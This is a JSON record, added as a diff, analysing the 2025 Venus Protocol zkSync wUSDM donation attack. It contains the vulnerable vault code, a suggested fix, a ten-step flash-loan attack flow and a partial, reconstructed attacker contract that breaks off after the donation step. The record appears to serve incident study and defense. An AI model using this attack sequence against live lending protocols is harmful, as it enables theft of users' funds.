@@ -1,0 +1,39 @@
+{
+ "id": "2025__2025-02-27_Venus_ZKSync_DonationAttack",
+ "source_file": "2025/2025-02-27_Venus_ZKSync_DonationAttack.md",
+ "title": "Venus Protocol (zkSync) — wUSDM Donation Attack Analysis",
+ "date": "2025-02-27",
+ "protocol": "Venus Protocol",
+ "chain": "zkSync Era",
+ "loss_raw": "~86.7 WETH",
+ "loss_usd": null,
+ "root_cause": "Directly donating USDM to the wUSDM vault to artificially inflate share value, then repeatedly triggering over-collateralized liquidations to acquire vWETH",
+ "attack_tx": "0x35a0...0d8",
+ "vulnerable_contract": "Venus Protocol wUSDM Pool (zkSync Era)",
+ "classes": [
+  "donation-inflation"
+ ],
+ "code_before": [
+  "// wUSDM.sol — Mountain Protocol (verified source, MIT license)\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.18;\n\nimport {ERC4626Upgradeable} from \"@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC4626Upgradeable.sol\";\n\ncontract wUSDM is ERC4626Upgradeable, /* ... other bases ... */ {\n\n    IUSDM public USDM;\n\n    // ❌ wUSDM does NOT override totalAssets().\n    // It inherits the standard OpenZeppelin ERC4626Upgradeable implementation:\n    //\n    //   function totalAssets() public view virtual override returns (uint256) {\n    //       return _asset.balanceOf(address(this));  // ← raw token balance of the vault\n    //   }\n    //\n    // This means ANY USDM tokens transferred directly to the wUSDM vault address\n    // (i.e., a \"donation\") immediately inflate totalAssets(), raising the\n    // assets-per-share ratio for ALL existing shareholders.\n\n    function initialize(IUSDM _USDM, address owner) external initializer {\n        USDM = _USDM;\n        __ERC20_init(\"Wrapped Mountain Protocol USD\", \"wUSDM\");\n        __ERC4626_init(_USDM);   // sets _asset = USDM; totalAssets() = USDM.balanceOf(this)\n        // ...\n    }\n\n    // No custom totalAssets() override — donation attack surface is fully open ❌\n\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {\n        if (USDM.isBlocked(from)) { revert wUSDMBlockedSender(from); }\n        if (paused()) { revert wUSDMPausedTransfers(); }\n        super._beforeTokenTransfer(from, to, amount);\n    }\n}\n\n// Venus Protocol uses wUSDM.convertToAssets(shares) to price collateral:\n//   convertToAssets(shares) = shares * totalAssets() / totalSupply()\n// After a USDM donation to the vault:\n//   totalAssets() spikes → convertToAssets() returns inflated value\n// → attacker's wUSDM collateral appears worth far more than it cost\n// → over-collateralized liquidations become profitable for the attacker ❌"
+ ],
+ "code_after": [
+  "// ✅ Fix: override totalAssets() to track only deposited assets, ignoring donations\nuint256 private _depositedAssets;\n\nfunction deposit(uint256 assets, address receiver) public override returns (uint256 shares) {\n    _depositedAssets += assets;\n    return super.deposit(assets, receiver);\n}\n\nfunction withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {\n    _depositedAssets -= assets;\n    return super.withdraw(assets, receiver, owner);\n}\n\nfunction totalAssets() public view override returns (uint256) {\n    return _depositedAssets; // ✅ donations do not inflate share price\n}"
+ ],
+ "steps": [
+  "→ [1] Flash loan 2,100 WETH from Aave",
+  "→ [2] WETH → mint vWETH (set as collateral)",
+  "→ [3] Borrow 35 vUSDM (wUSDM)",
+  "→ [4] Helper: vUSDM → mint additional vUSDM",
+  "→ [5] KEY: Donate USDM directly to wUSDM vault",
+  "totalAssets spikes → share price inflated",
+  "→ [6] Helper: Execute 35 liquidations repeatedly",
+  "→ [7] Acquired vWETH → redeem for WETH",
+  "→ [8] Helper: Borrow additional WETH",
+  "→ [9] Repay Aave flash loan (2,100 WETH + fees)",
+  "→ [10] ~86.7 WETH net profit"
+ ],
+ "other_code": [
+  "Attacker (Receiver Contract)\n  │\n  ├─→ [1] Flash loan 2,100 WETH from Aave\n  │\n  ├─→ [2] WETH → mint vWETH (set as collateral)\n  │\n  ├─→ [3] Borrow 35 vUSDM (wUSDM)\n  │         └─ Transfer to Helper contract\n  │\n  ├─→ [4] Helper: vUSDM → mint additional vUSDM\n  │\n  ├─→ [5] KEY: Donate USDM directly to wUSDM vault\n  │         └─ totalAssets spikes → share price inflated\n  │\n  ├─→ [6] Helper: Execute 35 liquidations repeatedly\n  │         └─ Acquire Receiver's vWETH collateral at inflated price\n  │\n  ├─→ [7] Acquired vWETH → redeem for WETH\n  │\n  ├─→ [8] Helper: Borrow additional WETH\n  │\n  ├─→ [9] Repay Aave flash loan (2,100 WETH + fees)\n  │\n  └─→ [10] ~86.7 WETH net profit",
+  "// Full PoC not available — reconstructed from summary\n\ncontract VenusAttackReceiver {\n    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        // [2] WETH → mint vWETH\n        IVToken(vWETH).mint(2100 ether);\n\n        // [3] Borrow 35 vUSDM\n        for (uint i = 0; i < 35; i++) {\n            IVToken(vUSDM).borrow(borrowAmount);\n        }\n        IERC20(wUSDM).transfer(helperContract, wUSDMBalance);\n\n        // [5] KEY: Donate USDM directly to wUSDM vault (inflate share price)\n        uint256 donationAmount = IERC20(USDM).balanceOf(address(this));\n        IERC20(USDM).transfer(address(wUSDMVault), donationAmount);"
+ ]
+}
